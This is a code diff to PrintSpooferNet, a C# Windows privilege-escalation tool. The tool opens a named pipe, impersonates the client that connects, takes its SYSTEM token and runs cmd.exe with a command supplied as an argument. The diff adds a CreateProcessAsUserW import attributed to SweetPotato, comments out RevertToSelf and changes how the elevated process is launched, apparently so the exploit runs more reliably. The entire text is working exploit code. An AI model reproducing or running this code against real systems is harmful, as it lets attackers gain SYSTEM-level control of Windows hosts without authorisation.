@@ -97,6 +97,12 @@ namespace PrintSpooferNet
         [DllImport("userenv.dll", SetLastError = true)]
         static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
 
+        //https://github.com/CCob/SweetPotato/blob/d153e821934fa6619e669fcc32e95e8f8b2043bb/Security/Privilege.cs#L144
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
+             bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+
         static void Main(string[] args)
         {
             uint PIPE_WAIT = 0x00000000;
@@ -114,16 +120,15 @@ namespace PrintSpooferNet
                 return;
             }
             string pipeName = args[0];
-            string ExecCommand = args[1]; 
+            string ExecCommand = args[1];
             IntPtr hPipe = CreateNamedPipe(pipeName, 3, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
             if (hPipe.ToInt32() == -1)
             {
                 Console.WriteLine("Error in Calling CreateNamedPipe: " + Marshal.GetLastWin32Error());
                 return;
             }
-
             Console.WriteLine("[+] Named Pipe Created: " + hPipe);
-            
+
             ConnectNamedPipe(hPipe, IntPtr.Zero);
             Console.WriteLine("[+] Pipe Connection");
             Console.WriteLine("[+] " + "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand);
@@ -140,9 +145,11 @@ namespace PrintSpooferNet
             String name = WindowsIdentity.GetCurrent().Name;
             Console.WriteLine("Impersonated user is: " + name);
 
-            RevertToSelf();
+            //RevertToSelf();
+            ExecCommand = "/c " + ExecCommand; 
 
-            res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi); //Change Local Executable Path
+            res = CreateProcessAsUserW(hSystemToken, "C:\\Windows\\System32\\cmd.exe", ExecCommand, IntPtr.Zero, IntPtr.Zero, false, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+            //res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi); //Change Local Executable Path
         }
     }
 }
